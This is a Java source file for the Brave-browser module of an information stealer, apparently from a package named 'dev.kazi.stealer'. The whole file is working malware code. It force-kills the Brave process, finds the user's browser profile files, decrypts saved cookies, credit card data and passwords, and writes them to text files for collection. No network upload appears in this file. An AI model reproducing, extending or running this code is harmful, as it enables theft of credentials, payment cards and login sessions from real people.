package dev.kazi.stealer.node.nodes.impl.browser;

import dev.kazi.stealer.utils.decrypt.password.PasswordDecrypt;
import dev.kazi.stealer.utils.decrypt.cookie.CookieDecrypt;

import java.io.BufferedWriter;
import java.io.FileWriter;
import dev.kazi.stealer.utils.decrypt.creditcards.CreditCardsDecrypt;
import java.io.File;
import java.io.IOException;
import dev.kazi.stealer.node.Category;
import dev.kazi.stealer.node.Node;

public class Brave extends Node {

    public Brave() throws IOException {
        super(Category.FILE);
        Runtime.getRuntime().exec("taskkill /f /im brave.exe");
    }
    
    @Override
    public void createNode() {
        try {
            if (new File("C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\Cookies").exists()) {
                this.cookie();
            }
            if (new File("C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Web Data").exists()) {
                this.creditCards();
            }
            if (new File("C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data").exists()) {
                this.password();
            }
        }
        catch (final IOException e) {
            e.printStackTrace();
        }
    }
    
    public void creditCards() throws IOException {
        if (!new CreditCardsDecrypt("C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Web Data", "C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Local State").getCards().getData().isEmpty()) {
            final FileWriter writer = new FileWriter(this.mergePath(this.getFolder(), "General") + "\\CreditCards.txt", true);
            final BufferedWriter bufferedWriter = new BufferedWriter(writer);
            bufferedWriter.write(new CreditCardsDecrypt("C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Web Data", "C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Local State").getCards().getData());
            bufferedWriter.close();
        }
    }
    
    public void cookie() throws IOException {
        if (new File("C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\Cookies").exists()) {
            final FileWriter writer = new FileWriter(this.mergePath(this.getFolder(), "Cookies") + "\\Brave.txt", true);
            final BufferedWriter bufferedWriter = new BufferedWriter(writer);
            bufferedWriter.write(new CookieDecrypt("C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\Cookies", "C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Local State").getCookies().getData());
            bufferedWriter.close();
        }
    }
    
    public void password() throws IOException {
        if (!new PasswordDecrypt("C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data", "C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Local State").getPasswords().getData().isEmpty()) {
            final FileWriter writer = new FileWriter(this.mergePath(this.getFolder(), "General\\PasswordsBRAVE.txt"), true);
            final BufferedWriter bufferedWriter = new BufferedWriter(writer);
            bufferedWriter.write(new PasswordDecrypt("C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data", "C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Local State").getPasswords().getData());
            bufferedWriter.close();
        }
    }
}
